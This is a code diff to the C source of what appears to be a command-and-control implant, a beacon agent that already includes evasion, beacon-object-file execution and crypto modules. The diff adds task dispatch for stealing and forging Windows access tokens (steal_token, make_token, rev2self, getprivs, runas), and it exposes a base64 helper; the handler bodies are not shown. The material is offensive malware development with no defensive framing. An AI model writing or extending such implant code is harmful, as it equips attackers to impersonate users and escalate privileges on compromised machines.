@@ -47,6 +47,7 @@
 #include "evasion.h"
 #include "bof.h"
 #include "crypto.h"
+#include "token.h"
 
 /* ── Runtime-configurable sleep (server can change via 'sleep' command) */
 static int g_sleep_ms   = 5000;
@@ -85,7 +86,7 @@ static void get_process_name(char *buf, size_t len) {
 
 /* ── Base64 ──────────────────────────────────────────────── */
 
-static void b64_encode(const unsigned char *in, size_t len, char *out) {
+void b64_encode(const unsigned char *in, size_t len, char *out) {
     static const char T[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
     size_t i, j = 0;
     for (i = 0; i < len; i += 3) {
@@ -470,6 +471,16 @@ static DWORD WINAPI run_beacon(LPVOID unused) {
                 handle_bof(args_decoded, out_b64);
             } else if (strcmp(task_cmd, "download") == 0) {
                 handle_download(args_decoded, out_b64);
+            } else if (strcmp(task_cmd, "steal_token") == 0) {
+                handle_steal_token(args_decoded, out_b64);
+            } else if (strcmp(task_cmd, "make_token") == 0) {
+                handle_make_token(args_decoded, out_b64);
+            } else if (strcmp(task_cmd, "rev2self") == 0) {
+                handle_rev2self(out_b64);
+            } else if (strcmp(task_cmd, "getprivs") == 0) {
+                handle_getprivs(out_b64);
+            } else if (strcmp(task_cmd, "runas") == 0) {
+                handle_runas(args_decoded, out_b64);
             } else if (strcmp(task_cmd, "exit") == 0) {
                 b64_encode((unsigned char*)"Agent exiting", 13, out_b64);
                 snprintf(body, sizeof(body), "{\"results\":[{\"task_id\":\"%s\",\"output\":\"%s\",\"success\":true}]}",
